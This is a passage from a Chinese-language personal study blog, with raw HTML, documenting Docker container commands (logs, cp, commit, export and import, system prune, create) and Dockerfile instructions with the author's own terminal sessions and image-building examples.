 0 - 37233 -      pts/1    00:00:00 ps[root@localhost ~]# docker top tom -lF                   S                   UID                 PID                 PPID                C                   PRI                 NI                  ADDR                SZ                  WCHAN               TTY                 TIME                CMD4                   S                   0                   8771                8753                80                  80                  0                   -                   546788              futex_              pts/0 [root@localhost ~]# docker top tom | grep 8753root                8771                8753                2                   17:02               pts/0               00:00:02            /usr/local/openjdk-8/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start</code></pre><h3 id="docker启停"><a href="#docker启停" class="headerlink" title="docker启停"></a>docker启停</h3><p>启动</p><pre><code>docker start xxdocker restart xx</code></pre><p>停止</p><pre><code>docker stop xx优雅停止docker kill xx强制停止[root@localhost ~]# docker stop/kill $(docker ps -q)c17bb9e779f40c5e1d974b26fc32e8b34259</code></pre><p>补充：pause&#x2F;unpause</p><p>日志监视不到，容器并没有暂停，但也访问不了</p><p>docker pause xx这个暂停的是容器对外提供的服务</p><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><pre><code>[root@localhost ~]# docker logs --helpUsage:  docker logs [OPTIONS] CONTAINERFetch the logs of a containerAliases:  docker container logs, docker logsOptions:      --details        Show extra details provided to logs  -f, --follow         Follow log output      --since string   Show logs since timestamp (e.g.                       &quot;2013-01-02T13:23:37Z&quot;) or relative (e.g. &quot;42m&quot;                       for 42 minutes)  -n, --tail string    Number of lines to show from the end of the logs                       (default &quot;all&quot;)  -t, --timestamps     Show timestamps      --until string   Show logs before a timestamp (e.g.                       &quot;2013-01-02T13:23:37Z&quot;) or relative (e.g. &quot;42m&quot;                       for 42 minutes)                    docker logs --since &quot;2024-03-04&quot; --tail 3 buntu  这里的日期也可以换成10s,10h，since也可以换成until docker logs -f -n 10 tom 这个f可以用来查看容器动态的日志</code></pre><h3 id="docker-cp"><a href="#docker-cp" class="headerlink" title="docker cp"></a>docker cp</h3><pre><code>[root@localhost ~]# docker cp --helpUsage:  docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-        docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATHCopy files/folders between a container and the local filesystemUse &#39;-&#39; as the source to read a tar archive from stdinand extract it to a directory destination in a container.Use &#39;-&#39; as the destination to stream a tar archive of acontainer source to stdout.Aliases:  docker container cp, docker cpOptions:  -a, --archive       Archive mode (copy all uid/gid information)  -L, --follow-link   Always follow symbol link in SRC_PATH  -q, --quiet         Suppress progress output during copy. Progress                      output is automatically suppressed if no terminal                      is attached</code></pre><pre><code>[root@localhost worksp]# lsmy.tar  new.tar  test.c[root@localhost worksp]# docker cp my.tar buntu:/rootSuccessfully copied 318MB to buntu:/root[root@localhost worksp]# docker exec -it buntu /bin/bashroot@0c5e1d974b26:/# cd /rootroot@0c5e1d974b26:~# lsmy.tar</code></pre><p><strong>但不支持容器间拷贝</strong></p><p><strong>tips:sudo 与 su 两个命令的最大区别是：</strong></p><p>sudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码。另外一个区别是其默认行为，sudo 命令只允许使用提升的权限运行单个命令，而 su 命令会启动一个新的 shell，同时允许使用 root 权限运行尽可能多的命令，直到明确退出登录。</p><h3 id="docker-commit"><a href="#docker-commit" class="headerlink" title="docker commit"></a>docker commit</h3><p>centos ifconfig用不了可以用yum安装net-tools</p><pre><code class="console">yum install -y net-tools</code></pre><pre><code class="console">[root@localhost ~]# docker commit --helpUsage:  docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]tag叫什么都行，如果这个repository和tag都没有命名，默认是null，就成悬虚镜像了Create a new image from a container&#39;s changesAliases:  docker container commit, docker commitOptions:  -a, --author string    Author (e.g., &quot;John Hannibal Smith                         &lt;hannibal@a-team.com&gt;&quot;)作者  -c, --change list      Apply Dockerfile instruction to the created image  可以增加指令，不常用  -m, --message string   Commit message提交  -p, --pause            Pause container during commit (default true) 暂停容器，up-&gt;暂停，默认时true </code></pre><p>例子：</p><pre><code>[root@localhost ~]# docker commit -a &quot;youzipii &lt;123@163.com&gt;&quot; -m &quot;Added net-tools&quot; ct1 centos7:net-toolssha256:ee655f40750fcdbee0c3fac1b6f7ffdf2b19c862bf4d4c7a0e52fc8930d52e01[root@localhost ~]# docker imagesREPOSITORY   TAG         IMAGE ID       CREATED         SIZEcentos7      net-tools   ee655f40750f   9 seconds ago   445MB[root@localhost ~]# docker inspect ee655f40750f可以看详细信息元数据开起来看看有没有net-tools[root@localhost ~]# docker run --name ct2 -it centos7:net-tools[root@c789c7b87faa /]# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</code></pre><p><strong>tips：删除悬虚镜像</strong></p><pre><code>[root@localhost ~]# docker image pruneWARNING! This will remove all dangling images.Are you sure you want to continue? [y/N] yDeleted Images:deleted: sha256:6c0ad715431faaa5ef68eecdc2a3cd489b66b6a765fb43775bb5376179d54138Total reclaimed space: 0B</code></pre><h2 id="容器导入导出"><a href="#容器导入导出" class="headerlink" title="容器导入导出"></a>容器导入导出</h2><h3 id="导出xport"><a href="#导出xport" class="headerlink" title="导出xport"></a>导出xport</h3><pre><code class="console">[root@localhost ~]# docker export --helpUsage:  docker export [OPTIONS] CONTAINERExport a container&#39;s filesystem as a tar archiveAliases:  docker container export, docker exportOptions:  -o, --output string   Write to a file, instead of STDOUT</code></pre><pre><code class="console">[root@localhost ~]# docker export -o tom1-ex.tar tom1[root@localhost ~]# lsanaconda-ks.cfg  Downloads             mycmd            Public       VideosDesktop          initial-setup-ks.cfg  original-ks.cfg  Templates    workspDocuments        Music                 Pictures         tom1-ex.tar</code></pre><h3 id="导入import"><a href="#导入import" class="headerlink" title="导入import"></a>导入import</h3><pre><code>[root@localhost ~]# docker import --helpUsage:  docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]Import the contents from a tarball to create a filesystem imageAliases:  docker image import, docker importOptions:  -c, --change list       Apply Dockerfile instruction to the created image  -m, --message string    Set commit message for imported image      --platform string   Set platform if server is multi-platform capable</code></pre><pre><code>[root@localhost ~]# docker import tom1-ex.tar tom8:importsha256:3c91db73c82f48199d9cb1c805d9f80c1da963736217573d33228067e50395f3[root@localhost ~]# docker imagesREPOSITORY   TAG         IMAGE ID       CREATED          SIZEtom8         import      3c91db73c82f   4 seconds ago    499MBtomcat       8.5.49      6408fdc94212   4 years ago      507MB</code></pre><p>变小了，是因为有些历史记录，描述等被删除了，同样，如果不指定，又会多一个悬虚镜像</p><h3 id="与save-、load对比"><a href="#与save-、load对比" class="headerlink" title="与save 、load对比"></a>与save 、load对比</h3><ul><li><p>save和export</p><p>分别作用于镜像和容器，export一次只能导出一个容器，save可以一次对多个镜像导出</p><p>export的小（合并后的，快照，原有的历史记录等描述性信息会被丢掉），save是原封不动得保留下来</p></li><li><p>import与load</p><p>import导入的是容器包，load加载的是镜相包，但最终都会恢复为镜像</p><p>import恢复的为镜像只包含当前镜像一层，load恢复的镜像与原来分层的是完全相同的（imageid相同）</p><p>import恢复的镜像就是新购剑的镜像，id与原镜像不同。、</p><p>import 可以为导入的镜像指定<repository>与<tag>，load 加载的镜像不能指定。</p></li></ul><h3 id="与docker-commit-的对比"><a href="#与docker-commit-的对比" class="headerlink" title="与docker commit 的对比"></a>与docker commit 的对比</h3><ul><li>相同点:docker export+docker import会将一个容器变为一个镜像，docker commit 也可以将一个容器变一个镜像。”</li><li>不同点:docker export+docker import 恢复的镜像仅包含原容器生成的一层分层.commit 生成的镜像中包含容器的原镜像的所有分层信息。”</li></ul><h2 id="docker-system-命令集"><a href="#docker-system-命令集" class="headerlink" title="docker system 命令集"></a>docker system 命令集</h2><pre><code class="bash">[youzipii@localhost ~]$ docker system --helpUsage:  docker system COMMANDManage DockerCommands:  df          Show docker disk usage 查看当前磁盘使用情况  events      Get real time events from the server  info        Display system-wide information  prune       Remove unused dataRun &#39;docker system COMMAND --help&#39; for more information on a command.</code></pre><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><pre><code>[youzipii@localhost ~]$ docker system df --helpUsage:  docker system df [OPTIONS]Show docker disk usageOptions:      --format string   Format output using a custom template:                        &#39;table&#39;:            Print output in table format                        with column headers (default)                        &#39;table TEMPLATE&#39;:   Print output in table format                        using the given Go template                        &#39;json&#39;:             Print in JSON format                        &#39;TEMPLATE&#39;:         Print output using the given                        Go template.                        Refer to https://docs.docker.com/go/formatting/                        for more information about formatting output with                        templates  -v, --verbose         Show detailed information on space usage  [root@localhost ~]# docker system dfTYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLEImages          10        4         2.784GB   2.036GB (73%)Containers      5         0         559.3MB   559.3MB (100%)Local Volumes   0         0         0B        0BBuild Cache     0         0         0B        0B</code></pre><h3 id="docker-system-enents"><a href="#docker-system-enents" class="headerlink" title="docker system enents"></a>docker system enents</h3><pre><code>[root@localhost ~]# docker system events --helpUsage:  docker system events [OPTIONS]Get real time events from the serverAliases:  docker system events, docker eventsOptions:  -f, --filter filter   Filter output based on conditions provided      --format string   Format output using a custom template:                        &#39;json&#39;:             Print in JSON format                        &#39;TEMPLATE&#39;:         Print output using the given                        Go template.                        Refer to https://docs.docker.com/go/formatting/                        for more information about formatting output with                        templates      --since string    Show all events created since timestamp      --until string    Stream events until this timestamp      docker system events2024-03-15T15:36:48.294313459+08:00 container create 5933b54ec9d2b725ff3b3350804c6ea2919272829651e45097d46ac5826806ee (image=tomcat:8.5.49, name=tom2)</code></pre><p>有点像日志监视器，有容器启停之类 的信息它会输出在这里</p><h3 id="docker-system-info"><a href="#docker-system-info" class="headerlink" title="docker system info"></a>docker system info</h3><pre><code class="bash">[root@localhost ~]# docker system infoClient: Docker Engine - Community Version:    25.0.3 Context:    default Debug Mode: false Plugins:  buildx: Docker Buildx (Docker Inc.)    Version:  v0.12.1...docker info也行</code></pre><h3 id="docker-system-prune-重点"><a href="#docker-system-prune-重点" class="headerlink" title="docker system prune(重点)"></a>docker system prune(重点)</h3><pre><code>[root@localhost ~]# docker system prune --helpUsage:  docker system prune [OPTIONS]Remove unused dataOptions:  -a, --all             Remove all unused images not just dangling ones 一出所有没在使用的镜像      --filter filter   Provide filter values (e.g. &quot;label=&lt;key&gt;=&lt;value&gt;&quot;)  -f, --force           Do not prompt for confirmation      --volumes         Prune anonymous volumes[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE           COMMAND             CREATED         STATUS                     PORTS                                       NAMES5933b54ec9d2   tomcat:8.5.49   &quot;/bin/bash&quot;         5 minutes ago   Exited (0) 5 minutes ago                                               tom2fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   12 days ago     Up 11 minutes              0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom[root@localhost ~]# docker system pruneWARNING! This will remove:  - all stopped containers  - all networks not used by at least one container  - all dangling images  - unused build cacheAre you sure you want to continue? [y/N] yDeleted Containers:5933b54ec9d2b725ff3b3350804c6ea2919272829651e45097d46ac5826806eeTotal reclaimed space: 5B[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE           COMMAND             CREATED       STATUS          PORTS                                       NAMESfc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   12 days ago   Up 11 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</code></pre><h2 id="docker-create"><a href="#docker-create" class="headerlink" title="docker create"></a>docker create</h2><p>和docker run基本上差不多，但没有-d选项。-d是后台，因为create创建但不运行，默认都是后台的</p><pre><code>[root@localhost ~]# docker create --name tom1 -p 8081:8080 tomcat:8.5.496264b6fbe42c8866557c617c52f31894f72ff9920f807e8029e734382e30f67b[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE           COMMAND             CREATED         STATUS    PORTS     NAMES6264b6fbe42c   tomcat:8.5.49   &quot;catalina.sh run&quot;   3 seconds ago   Created             tom1</code></pre><p>docker create 命令仅用于创建一个容器，并不会启动容器。该命令没有-d选项,因为 docker create 命令创建的容器默认都是以后台方式来运行的(必须要通过 dockerstart [容器]来启动),除非创建时指定-it</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="容器基础"><a href="#容器基础" class="headerlink" title="容器基础"></a>容器基础</h3><p>​深刻理解，容器存在的意义就是为其中的应用提供运行环境:容器运行的意义就是为了运行买中的应用，让应用对外提供服务。所以启动容器的目的就是为了启动并运行容器中的应用。所以容器中的应用运行完毕后，容器就会自动终止。</p><h3 id="创建启动"><a href="#创建启动" class="headerlink" title="创建启动"></a>创建启动</h3><p>​理解 docker run 命令用于创建并启动容器，同时其会运行容器中指定的应用。这个指定的应用要么通过 docker run 中的[command]指定，要么通过容器镜像的 Dockerfile 中的 CMD指令指定。。</p><p>​掌握容器的两种启动模式:交互模式-it，分离模式-d。。</p><h3 id="容器退出命令-1"><a href="#容器退出命令-1" class="headerlink" title="容器退出命令"></a>容器退出命令</h3><p>exit:退出并终止当前容器</p><p>ctrl+p+q:退出但不终止当前容器</p><h3 id="容器状态查看命令"><a href="#容器状态查看命令" class="headerlink" title="容器状态查看命令"></a>容器状态查看命令</h3><p>docker ps命令中-a、-q、-l、-n选项</p><h3 id="容器再进命令"><a href="#容器再进命令" class="headerlink" title="容器再进命令"></a>容器再进命令</h3><p>​理解 docker exec 与 docker attach 的区别与联系:</p><p>docker exec:会新建一个进程来访问容器，一般与-it选项联用，exit命令退出</p><p>docker attach:不会新建进程，而是将标准输入和标准输出直接附着在容器进程之上（使用户可以通过键盘来操作容器，使容器的输出可以通过显示器展示给用户），一般不使用选项，但退出时需要考虑exit还是c+q+q</p><h3 id="容器内进程查看命令"><a href="#容器内进程查看命令" class="headerlink" title="容器内进程查看命令"></a>容器内进程查看命令</h3><p>docker top命令后可携带ps命令的选项</p><h3 id="容器日志查看命令"><a href="#容器日志查看命令" class="headerlink" title="容器日志查看命令"></a>容器日志查看命令</h3><p>docker logs查看的是容器中应用的运行日志，这个应用是根据容器创建时命令(docker run 或 docker create)中的[cmd]指定，要么通过容器镜像的 Dockerfile 中的 CMD 指令指定。。</p><h3 id="容器启停命令"><a href="#容器启停命令" class="headerlink" title="容器启停命令"></a>容器启停命令</h3><ul><li>​理解以下几点:”容器启动命令启动的是容器本身，但容器在启动的同时会启动一个应用，而这个应用是根据容器创建时命令(docker run 或 docker create)中的[command]指定，或通过容器镜像的Dockerfile 中的 CMD 指令指定。”</li><li>​容器停止命令停止的是容器本身,但在容器停止之前会先停止容器中的所有进程的运行，也就停止了对外提供服务的应用进程。</li><li>​暂停命令仅暂停的是容器对外提供服务,容器本身并没有停止运行,所以容器中的应用也就没有停止运行，只不过其不能通过容器再对外提供服务了。</li><li>暂停&#x2F;解除暂停两个命令对 tomcat 容器中的 tomcat 进程的运行没有任何影响，这两个命令的运行并不会记录到 tomcat 的启停日志中。</li></ul><h3 id="容器删除和镜像删除"><a href="#容器删除和镜像删除" class="headerlink" title="容器删除和镜像删除"></a>容器删除和镜像删除</h3><p>​能够区分容器删除与镜像删除命令:容器删除是dockerrm，镜像删除是 docker rmi。它们都有一个选项-f，表示强制删除。镜像的强制删除，其不会强制删除 UP 状态的容器的镜像。</p><h3 id="容器与宿主机传递文件"><a href="#容器与宿主机传递文件" class="headerlink" title="容器与宿主机传递文件"></a>容器与宿主机传递文件</h3><ol><li>深刻理解容器本身就是一个文件系统</li><li>理解 docker cp命令就是用于完成从一个文件系统复制到另一个文件系统而己，与容器是否运行无关。</li><li>了解 docker cp命令不支持容器间文件的复制。</li></ol><h3 id="提交容器为镜像"><a href="#提交容器为镜像" class="headerlink" title="提交容器为镜像"></a>提交容器为镜像</h3><p>了解 docker commit 生成的镜像中是包含原镜像的所有分层历史记录的。</p><h3 id="导入-x2F-导出容器"><a href="#导入-x2F-导出容器" class="headerlink" title="导入&#x2F;导出容器"></a>导入&#x2F;导出容器</h3><ol><li>理解导入&#x2F;导出容器与导入&#x2F;导出镜像命令的区别与联系。</li><li>理解导入&#x2F;导出容器与 docker commit 的区别与联系。</li><li>理解 docker export 是对镜像分层合并后视图的文件系统快照的导出，仅包含合并后的一层镜像信息，不包含原镜像的分层历史记录。</li></ol><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><h3 id="Dockerfile-简介"><a href="#Dockerfile-简介" class="headerlink" title="Dockerfile 简介"></a>Dockerfile 简介</h3><p>Dockerfile 是用于构建 Docker 镜像的脚本文件，由一系列指令构成。通过 docker build命令构建镜像时，Dockerfile 中的指令会<strong>由上到下</strong>依次执行，每条指令都将会构建出一个镜像。这就是镜像的分层。因此，指令越多，层次就越多，创建的镜像就越多，效率就越低所以在定义 Dockerfile 时，能在一个指令完成的动作就不要分为两条。。</p><h3 id="指令简介"><a href="#指令简介" class="headerlink" title="指令简介"></a>指令简介</h3><p>对于 Dockerfile 的指令，需要注意以下几点:</p><ol><li>指令是大小不敏感的，但惯例是写为全大写</li><li>指令后至少会携带一个参数。</li><li>#号开头的行为注释。。</li></ol><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>【语法】FROM <image>[:<tag>].</p><p>【解析】用于指定基础镜像，且必须是<strong>第一条</strong>指令;若省略了tag，则默认为latest。</p><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>【语法】MAINTAINER <name>.</p><p>【解析】MAINTAINER 指令的参数填写的一般是维护者姓名和信箱。不过，该指令官方已不建议使用，而是使用 LABEL指令代替。</p><h3 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h3><p>【语法】LABEL<key>&#x3D;<value> <key>&#x3D;<value></p><p>【解析】LABEL 指令中可以以键值对的方式包含任意镜像的元数据信息，用于替代MAINTAINER 指令。通过 docker inspect 可査看到 LABEL与 MAINTAINER 的内容。</p><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>【语法 1】ENV <key><value>.</p><p>【解析】用于指定环境变量，这些环境变量，后续可以被 RUN 指令使用，容器运行起来之后，也可以在容器中获取这些环境变量。。</p><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>【语法1】ADD<src> <dest></p><p>【语法 2】ADD[“<src>“,”<dest>“] #路径中存在空格时使用双引号引起来。</p><p>【解析】该指令将复制当前宿主机中指定文件 src到容器中的指定目录 dest 中。src 可以是宿主机中的绝对路径，也可以时相对路径。但相对路径是相对于dockerbuild 命令所指定的路径的。src指定的文件可以是一个压缩文件，压缩文件复制到容器后会自动解压为目录:src也可以是一个 URL，此时的 ADD指令相当于 wget 命令;src最好不要是目录，其会将该目录中所有内容复制到容器的指定目录中。dest 是一个绝对路径,其最后面的路径必须要加上斜杠，否则系统会将最后的目录名称当做是文件名的。</p><pre><code class="dockerfile">FROM centos:7WORKDIR /optADD zookeeper.tar.gz /opt/add/COPY zookeeper.tar.gz /opt/copy/CMD [&quot;/bin/bash&quot;]</code></pre><p><img src="/../image/image-20240408193507130.png" alt="image-20240408193507130"></p><p>可以发现add的是解压后的，而copy是没解压的</p><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>【说明】功能与 ADD指令相同，只不过src不能是 URL。若 src为压缩文件，复制到容器后不会自动解压。”</p><pre><code class="dockerfile">FROM centos:7WORKDIR /optADD zookeeper.tar.gz /opt/addCOPY zookeeper.tar.gz /opt/copyCMD [&quot;/bin/bash&quot;]</code></pre><p><img src="/../image/image-20240408193751454.png" alt="image-20240408193751454"></p><p>没有尾巴的斜杠后，<strong>copy变成了重命名</strong>，而add则是正常的，如果是改前面的压缩包的路径，在构建镜像时需要注意相对路径，所以我们在构建镜像时最好把需要的文件</p><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>【语法】WORKDIR path.</p><p>【解析】容器打开后默认进入的目录，一般在后续的 RUN、CMD、ENTRYPOINT、ADD 等指令中会引用该目录。可以设置多个WORKDIR指令。后续 WORKDIR 指令若用的是相对路径，则会基于之前 WORKDIR 指令指定的路径。在使用 docker run 运行容器时，可以通过-w 参数覆盖构建时所设置的工作目录。</p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>【语法 1】RUN <command></p><p>【解析】这里的<command>就是 shell 命令。docker build 执行过程中，会使用 shell 运行指定的command.</p><p>【语法 2】RUN [“EXECUTABLE”,”PARAM1”,”PARAM2”,…].【解析】在 docker build 执行过程中,会调用第一个参数”EXECUTABLE”指定的应用程序运行,并使用后面第二、三等参数作为应用程序的运行参数。</p><h3 id="CMD（重要）"><a href="#CMD（重要）" class="headerlink" title="CMD（重要）"></a>CMD（重要）</h3><p>【语法 1】CMD [“EXECUTABLE”,”PARAM1”,”PARAM2”,..].</p><p>【解析】在容器启动后，即在执行完 docker run后会立即调用执行”EXECUTABLE”指定的可执行文件，并使用后面第二、三等参数作为应用程序的运行参数。”</p><p>【语法2】CMD command param1 param2, ….</p><p>【解析】这里的 command 就是 shel 命令。在容器启动后会立即运行指定的 shell 命令。。</p><p>【语法 3】CMD [“PARAM1”,”PARAM2”,…].【解析】提供给 ENTERYPOINT 的默认参数。”</p><h3 id="ARGS"><a href="#ARGS" class="headerlink" title="ARGS"></a><strong>ARGS</strong></h3><p><img src="/../image/image-20240408201240156.png" alt="image-20240408201240156"></p><pre><code class="dockerfile">FROM centos:7ARG name=TOMRUN echo $name</code></pre><p><img src="/../image/image-20240408201343187.png" alt="image-20240408201343187"></p><p>要注意的是，build-arg是要定义过的变量，改都不行，一定要定义过arg才行</p><h3 id="注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile"><a href="#注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile" class="headerlink" title="注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile"></a>注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile</h3><p>例子：</p><pre><code class="dockerfile">FROM centos:7CMD [&quot;cal&quot;]</code></pre><p>docker built -t  mycal:2.0 .&#x2F;docker build -f Dockerfile -t mycal:2.0 .</p><p>执行，可以覆盖，比如在docker run mycal:2.0后面加上date结果就会出现变化，但参数也不能传递，如-y</p><p><img src="/../image/image-20240408164303105.png" alt="image-20240408164303105"></p><pre><code class="dockerfile">FROM centos:7CMD [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;cal&quot;]</code></pre><p>我要执行的命令是来自命令行，这两个执行的区别是&#x2F;bin&#x2F;bash才是你要执行的东西，cal成为了参数，前者是直接执行cal,测试一下把</p><pre><code class="bash">docker build -f Dockerfile3 -t mycal:3.0 .</code></pre><p><img src="/../image/image-20240408165326037.png" alt="image-20240408165326037"></p><pre><code class="dockerfile">FROM centos:7CMD [&quot;hello,world!&quot;]ENTRYPOINT [&quot;echo&quot;]</code></pre><p><img src="/../image/image-20240408170845565.png" alt="image-20240408170845565"></p><p>可以看但cmd作为entrypoint的参数执行了</p><h3 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT."></a>ENTRYPOINT.</h3><p>【语法 1】ENTRYPOINT [“EXEGUTABLE”,”PARAM1”,”PARAM2”,…]</p><p>【解析】在容器启动过程中，即在执行 docker run 时，会调用执行”EXECUTABLE”指定的应用程序，并使用后面第二、三等参数作为应用程序的运行参数。(CMD和它都有的话，执行这个)</p><p>【语法2】ENTRYPOlNT command param1 param2,…</p><p>【解析】这里的 command 就是 shel 命令。在容器启动过程中，即在执行 docker run 时，会运行指定的 shell 命令。</p><p>例子：</p><pre><code class="dockerfile">FROM centos:7ENTRYPOINT cal</code></pre><p><img src="/../image/image-20240408165939812.png" alt="image-20240408165939812"></p><p><img src="/../image/image-20240408170029994.png" alt="image-20240408170029994"></p><p>-y有输出但和date一样不识别</p><pre><code class="dockerfile">FROM centos:7ENTRYPOINT [&quot;cal&quot;]</code></pre><p><img src="/../image/image-20240408170218134.png" alt="image-20240408170218134"></p><p><img src="/../image/image-20240408170302307.png" alt="image-20240408170302307"></p><p>-y是行的，但date会报错了</p><pre><code class="dockerfile">FROM centos:7ENTRYPOINT [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;cal&quot;]</code></pre><p><img src="/../image/image-20240408170435245.png" alt="image-20240408170435245"></p><p>又和第一个一样了。</p><p>Dockerfile中的[command]或[“EXECUTABLE”]如果是通过CMD指定的，则该镜像的启动命令dockerrun中是不能添加参数[ARG]的。因为Dockerfile中的CMD是可以被命令中的[COMMAND]替代的。如果命令中的IMAGE后仍有内容，此时对于docker daemon 来说，其首先认为是替代用的[COMMAND]，如果有两个或两个以上的内容，后面的内容才会认为是[ARG]。所以，添加的-y会报错，因为没有-y这样的[COMMAND]。3</p><p>Dockerfile中的[command]或[“EXECUTABLE”]如果是通过CMQ指定的，则该镜像的启动命令dockerrun中是不能添加参数[ARG]的。因为Dockerfile中的CMD是可以被命令中的[COMMAND]替代的。如果命令中的IMAGE后仍有内容，此时对于dockerdaemon来说，其首先认为是替代用[COMMAND]，如果有两个或两个以上的内容，后面的内容才会认为是[ARG]。所以，添加的-y会报错，因为没有-y这样的[COMMAND]。</p><p>不过，docker daemon 对于 ENTRYPOINT 指定的[command]与[“EXECUTABLE”]的处理方式是不同的。如果是[command]指定的 shell，daemon 会直接运行，而不会与docker run 中的[ARG]进行拼接后运行:如果是[“EXECUTABLE”]指定的命令，daemon则会先与 docker run 中的[ARG]进行拼接，然后再运行拼接后的结果。</p><p>结论:无论是CMD还是ENTRYPOINT，使用[“EXECUTABLE”]方式的通用性会更强些。</p><h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>【语法】ONBUILD [INSTRUCTION]<br>【解析】该指令用于指定当前镜像的子镜像进行构建时要执行的指令。</p><pre><code class="dockerfile">FROM centos:7ENV WORKPATH /usr/localWORKDIR $WORKPATHONBUILD RUN yum install -y wgetCMD /bin/bash</code></pre><p>Dockerfile2</p><pre><code class="dockerfile">FROM parent:1.0</code></pre><p><img src="/../image/image-20240408202024812.png" alt="image-20240408202024812"></p><p><img src="/../image/image-20240408202014168.png" alt="image-20240408202014168"></p><p><img src="/../image/image-20240408202200083.png" alt="image-20240408202200083"></p><p><img src="/../image/image-20240408202217208.png" alt="image-20240408202217208"></p><h3 id="自己的hello-world镜像"><a href="#自己的hello-world镜像" class="headerlink" title="自己的hello world镜像"></a>自己的hello world镜像</h3><h4 id="scratch镜像"><a href="#scratch镜像" class="headerlink" title="scratch镜像"></a>scratch镜像</h4><p>​在构建自己的镜像之前，首先要了解一个特殊的镜像 scratch。scratch 镜像是一个空镜像，是所有镜像的 Baselmage(相当于面向对象编程中的 Object类)。scratch 镜像<strong>只能在 Dockerfile 中被继承</strong>,不能通过 pul 命令拉取,不能 run,也没有 tag。并且它也不会生成镜像中的文件系统层。在 Docker 中，scratch 是一个保留字，用户不能作为自己的镜像名称使用。。</p><pre><code>[root@localhost ~]# mkdir hw[root@localhost ~]# cd hw[root@localhost hw]# ls[root@localhost hw]# vim hello.c[root@localhost hw]# gcc --static -o hello hello.c[root@localhost hw]# lshello  hello.c[root@localhost hw]# ./hellohello my docker world![root@localhost hw]# docker build -t hello-my-world .[+] Building 0.1s (5/5) FINISHED                                 docker:default =&gt; [internal] load build definition from Dockerfile                       0.0s =&gt; =&gt; transferring dockerfile: 137B                                       0.0s =&gt; [internal] load .dockerignore                                          0.0s =&gt; =&gt; transferring context: 2B                                            0.0s =&gt; [internal] load build context                                          0.0s =&gt; =&gt; transferring context: 865.65kB                                      0.0s =&gt; [1/1] ADD hello /                                                      0.0s =&gt; exporting to image                                                     0.0s =&gt; =&gt; exporting layers                                                    0.0s =&gt; =&gt; writing image sha256:74852c0574d8c68375d7bb15fcddbc9b3e106863435bd  0.0s =&gt; =&gt; naming to docker.io/library/hello-my-world   [root@localhost hw]# docker imagesREPOSITORY       TAG         IMAGE ID       CREATED              SIZEhello-my-world   latest      74852c0574d8   About a minute ago   865kB。。。[root@localhost hw]# docker run hello-my-worldhello my docker world!</code></pre><h3 id="自己的centos镜像"><a href="#自己的centos镜像" class="headerlink" title="自己的centos镜像"></a>自己的centos镜像</h3><pre><code class="dockerfile">FROM centos:7MAINTAINER youzipii youzipii@123.comLABEL version=&quot;1.0&quot; description=&quot;this is a centos 7 image&quot; email=&quot;TOM@123.com&quot;ENV  WORKPATH /usr/localWORKDIR $WORKPATHRUN yum install -y wget vim net-toolsCMD /bin/bash</code></pre><h4 id="ERROR-failed-to-solve-process-“-x2F-bin-x2F-sh-c-yum-install-y-wget-vim-net-tools”-did-not-complete-successfully-exit-code-1"><a href="#ERROR-failed-to-solve-process-“-x2F-bin-x2F-sh-c-yum-install-y-wget-vim-net-tools”-did-not-complete-successfully-exit-code-1" class="headerlink" title="ERROR: failed to solve: process “&#x2F;bin&#x2F;sh -c yum install -y wget vim net-tools” did not complete successfully: exit code: 1"></a>ERROR: failed to solve: process “&#x2F;bin&#x2F;sh -c yum install -y wget vim net-tools” did not complete successfully: exit code: 1</h4><p>重启好像就可以，但生产环境，慎用</p><pre><code 